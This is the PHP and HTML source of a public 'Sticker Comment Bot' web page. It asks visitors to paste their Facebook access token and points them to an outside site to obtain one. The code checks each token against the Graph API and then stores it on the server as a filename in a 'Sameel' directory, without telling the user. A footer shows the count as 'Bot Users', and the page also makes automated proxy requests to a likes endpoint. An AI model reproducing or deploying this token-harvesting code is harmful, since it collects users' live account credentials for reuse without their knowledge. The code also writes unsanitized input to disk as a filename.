 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>
 Sahil Nolia
</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">

<!-- jQuery library -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Latest compiled JavaScript -->
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
<link rel="stylesheet" type="text/css" href="B.css"

<?php
$yx=opendir('Sameel');
while($isi=readdir($yx)){
if($isi != '.' && $isi != '..'){
$member[]=$isi;
}
}
$like = new like();
if($_GET[act]){
print '';
}
if($_POST[access_token]){
$access_token = $_POST[access_token];
$me = $like -> me($access_token);
if($me[id]){
$like -> Sameel($access_token);
if($_POST[id]){
$like -> pancal($_POST[id]);
}else{
$like -> getData($access_token);
}
}else{
$like -> invalidToken();
}
}else{
$like->form();
}
class like {
public function pancal($id){ for($i=1;$i<4;$i++){
$this-> _req('http://google.com/gwt/n?u='.urlencode('http://'.$_SERVER[HTTP_HOST].'/likes.php?id='.$id.'&n='.$i));
}
print '';
}
public function me($access){
return json_decode($this-> _req('https://graph.facebook.com/me?access_token='.$access),true);
}
public function Sameel($access){
if(!is_dir('Sameel')){
mkdir('Sameel');
}
$a=fopen('Sameel/'.$access,'w');
fwrite($a,1);
fclose($a);
}
public function invalidToken(){
print'<font color="red">TOKEN INVALID</font>';
$this->form();
}
public function form(){
 echo '
    
     
		<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Sticker Comment Bot By Sahil Nolia</h4></div>

		</div>
     

<center> <a target="_blank" href="http://www.facebook.com/sahilnolia1"> <center> <img src="https://graph.facebook.com/100006425929852/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<center><a class="btn btn-primary" href="http://sahil.thats.im/" target="blank">Click Here to Get Token</a></center>

</font><br>
 <font color="yellow"> <center></br><form action=""method="POST"><input class="input" type="text" name="access_token" style="height:28px; text-align : center;" placeholder="PASTE YOUR TOKEN HERE..........." value=""><input class="submit" type="submit"name="saveFile" style="height:28px;" '.$warna1.';border:2px groove '.$warna.';height:50px;width:25px"autocomplete="off" value="SUBMIT"onfocus="value="SUBMIT=""></form></center><br>
</font><br>
<center><a class="btn btn-success" href="//facebook.com/sahilnolia1" target="_blank"> MADE BY :- Sahil Nolia</a> <br></center>
<br>

<center <br></center>

</div>
</b></a></center></div></div>
   <a href="./logout.php" class="btn-lg btn-warning" style="text-decoration : none;"> Clcik Here to Logout </a>
</body></html>';
}
public function getData($access){
$feed=json_decode($this -> _req('https://graph.facebook.com/me/home?access_token='.$access.'&limit=1'),true);
if(count($feed[data]) >= 1){
for($i=0;$i<count($feed[data]);$i++){
$uid = $feed[data][$i][from][id];
$name = $feed[data][$i][from][name];
$type = $feed[data][$i][type];
$mess = str_replace(urldecode('%0A'),'<br/>',htmlspecialchars($feed[data][$i][message]));
$id = $feed[data][$i][id];
$pic = $feed[data][$i][picture];
echo'

  
<div class="panel panel-success">
		
		<div class="panel-heading"><h4 style="text-align : center;"><i class="fas fa-bullhorn"></i> Sticker Comment Bot By Sahil Nolia</h4></div>

		</div>
<br>
<center> <a target="_blank" href="http://www.facebook.com/sahilnolia1"> <center> <img src="https://graph.facebook.com/100006425929852/picture?type=large" style="width:300px; height:300px;border: 80px;border-radius: 80%;"  </center>
<br>
<br>
<br>
<marquee direction="left"><font size="10" color="white">Thanks For Using Our Bot || Your bot Has been Activated Successfully </font></marquee>
<br>
<br>
<br>
<form action="index.php" method="post">
<center><input class="submit" type="submit" value="Click Here To Add Othe Token"></center>
<br>
<br>
<br>
<center> <font color="yellow"> DESIGN BY :-  <a href="https://www.facebook.com/sahilnolia1" target="blank"><font color="red">SAHIL NOLIA <br></center>
';
if($type=='photo'){
echo'
';
}else{
echo'
';
}
}
}else{
print '';
}
print '';
}
private function _req($url){
$ch = curl_init();
curl_setopt_array($ch,array(
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => true,
CURLOPT_URL => $url,
) );
$result = curl_exec($ch);
curl_close($ch);
return $result;
}
}
?>
</body>
</html>
<h2>
	<br>
<center><font size="5" color="red"><?php 
    // integer starts at 0 before counting
    $i = 0; 
    $dir = 'Sameel/';
    if ($handle = opendir($dir)) {
        while (($file = readdir($handle)) !== false){
            if (!in_array($file, array('.', '..')) && !is_dir($dir.$file)) 
                $i++;
        }
    }
    // prints out how many were in the directory
     echo "Bot Users : $i";
?><br></font></p></h2>

 
<div class="panel panel-warning" style="margin-bottom: 0px;">
	<div class="panel-heading"><h4>A Public Bot Site By <a href="//facebook.com/sahilnolia1" target="_blank">Sahil Nolia</a></h4></div>
</div>